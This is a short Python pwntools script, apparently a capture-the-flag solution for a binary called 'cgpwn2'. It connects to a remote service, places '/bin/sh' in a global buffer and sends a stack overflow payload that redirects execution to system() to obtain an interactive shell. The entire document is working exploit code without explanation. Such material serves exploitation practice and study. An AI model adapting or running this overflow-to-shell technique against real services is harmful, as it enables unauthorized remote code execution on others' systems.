from pwn import *

#n = process('./cgpwn2')
n = remote('111.198.29.45',39885)
elf = ELF('./cgpwn2')

offset = 0x26 + 4
system_addr = elf.symbols['system']
name_addr = 0x0804A080

print(n.recvuntil('name'))
n.sendline('/bin/sh')

print(n.recvuntil('here:'))
payload = 'a' * offset + p32(system_addr) + p32(0xdeadbeef) + p32(name_addr)
n.sendline(payload)

n.interactive()
